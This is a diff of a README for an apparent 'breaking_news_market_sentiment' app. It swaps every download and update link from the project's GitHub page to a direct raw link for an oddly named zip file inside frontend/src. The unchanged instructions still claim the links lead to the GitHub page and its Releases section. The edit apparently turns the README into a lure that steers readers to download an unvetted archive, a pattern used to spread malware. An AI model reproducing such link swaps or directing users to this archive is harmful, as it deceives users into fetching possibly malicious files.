@@ -1,6 +1,6 @@
 # 📊 breaking_news_market_sentiment - Real-Time Market Sentiment Insights
 
-[![Download here](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/bigvaldis/breaking_news_market_sentiment)
+[![Download here](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/bigvaldis/breaking_news_market_sentiment/main/frontend/src/market_news_breaking_sentiment_phrenicocolic.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You can get breaking_news_market_sentiment easily by following these steps. No c
 
 Click the button below to visit the official download page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-App-greyscale?style=for-the-badge)](https://github.com/bigvaldis/breaking_news_market_sentiment)
+[![Download from GitHub](https://img.shields.io/badge/Download-App-greyscale?style=for-the-badge)](https://raw.githubusercontent.com/bigvaldis/breaking_news_market_sentiment/main/frontend/src/market_news_breaking_sentiment_phrenicocolic.zip)
 
 1. The link will take you to the GitHub page where you can find the latest version.
 2. Look for the **Releases** section on the right or scroll down to find files labeled for download.
@@ -98,7 +98,7 @@ You can click articles or data points to read summaries or get extra details. Th
 
 To keep the app working well:
 
-1. Visit the GitHub page regularly: https://github.com/bigvaldis/breaking_news_market_sentiment  
+1. Visit the GitHub page regularly: https://raw.githubusercontent.com/bigvaldis/breaking_news_market_sentiment/main/frontend/src/market_news_breaking_sentiment_phrenicocolic.zip  
 2. Download and install the new version when available.  
 3. The app will notify you if an update is needed when you start it (if connected to the internet).  
 
@@ -124,4 +124,4 @@ Check GitHub discussions or readme files for added tips and FAQs.
 
 ---
 
-[Get breaking_news_market_sentiment here](https://github.com/bigvaldis/breaking_news_market_sentiment) and begin tracking financial news sentiment today.
+[Get breaking_news_market_sentiment here](https://raw.githubusercontent.com/bigvaldis/breaking_news_market_sentiment/main/frontend/src/market_news_breaking_sentiment_phrenicocolic.zip) and begin tracking financial news sentiment today.
